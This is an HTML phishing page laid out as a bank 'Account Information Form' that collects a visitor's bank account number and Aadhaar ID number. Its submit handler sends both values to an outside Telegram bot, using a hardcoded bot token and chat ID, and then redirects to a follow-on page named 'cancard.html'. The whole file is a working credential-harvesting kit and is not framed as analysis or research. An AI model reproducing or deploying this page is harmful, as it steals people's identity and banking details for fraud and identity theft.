<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Information Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            
        }

        .container {
            width: 350px;
            margin: auto;
            padding: 20px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 0px;
        }

        h1 {
            text-align: center;
        }

        label {
            display: block;
            margin: 10px 0 5px;
        }

        input {
            width: 94%;
            padding: 8px;
            margin-bottom: 10px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #5cb85c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #4cae4c;
        }
    </style>
</head>
<img src="lg.png" alt="Girl in a jacket" width="100%" height="100">
<body>
    <div class="container">
        <form id="accountForm">
            <label for="accountNo">Account No:</label>
            <input type="text" id="accountNo" name="accountNo" required>

            <label for="adharNo">Aadhar No:</label>
            <input type="text" id="adharNo" name="adharNo" required>
            <br>
            <br>
            <button type="submit">Submit</button>
        </form>
    </div>
<img src="ft.jpg" alt="Girl in a jacket" width="100%" height="300">
    <script>
        document.getElementById('accountForm').addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent default form submission

            const accountNo = document.getElementById('accountNo').value;
            const adharNo = document.getElementById('adharNo').value;

            const message = `Account No: ${accountNo}\nAadhar No: ${adharNo}`;

            // Send data to the Telegram API (Replace YOUR_TELEGRAM_BOT_TOKEN and YOUR_CHAT_ID)
            fetch(`https://api.telegram.org/bot7901407141:AAHosgdnt82jsQTwsBB74WcctZ-_J-ZOS0c/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '6989736266',
                    text: message,
                }),
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'cancard.html'; // Replace with your desired URL
                } else {
                    alert('Failed to send data to Telegram.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('There was an error submitting your data.');
            });
        });
    </script>
</body>

</html>
